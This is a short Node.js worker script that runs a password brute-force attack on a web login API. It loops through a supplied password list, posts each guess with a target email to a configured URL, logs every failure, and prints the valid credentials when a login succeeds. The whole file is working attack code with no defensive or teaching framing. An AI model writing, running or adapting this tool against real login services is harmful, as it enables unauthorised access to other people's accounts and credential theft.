import fs from 'fs'
import chalk from 'chalk'
import 'dotenv/config'
import { workerData, parentPort } from 'worker_threads'

const {API_URL,email,passwords,t1} = workerData


async function bruteForceAttack(password){
    try {
        // fetch data with post Request
        const response = await fetch(API_URL,{
            method:'POST',
            body:JSON.stringify({
                email,
                password
            }),
            headers:{
                'Content-type':'application/json'
            }
        })
        // if response with status OK then return true and log the password
        if(response.ok){
            const t2 = Date.now()
            console.log(chalk.green.bold(`Login Successfully Email:${email} , Password:${password} valid, time: ${(t2-t1)/1000}s`));
            process.exit(0)
        }
        // if response !== OK then return false with incorrect password
        console.log(chalk.red(`Login Failed, Password ${password} invalid`));
        return false
    } catch (error) {
        console.log(chalk.red(`Login Failed, Password ${password} invalid, Error: ${error.message}`));
        return false
    }
}

async function main(){
    try {
        // get array of passwords from file password.txt
        for(let password of passwords){
            // if password is valid then stop the Loop
            await bruteForceAttack(password)
        }
    } catch (error) {
        // failed to read the file
        console.log(chalk.red('Error ',error.message));
        process.exit(0)
    }
    parentPort.postMessage('done')
}

main()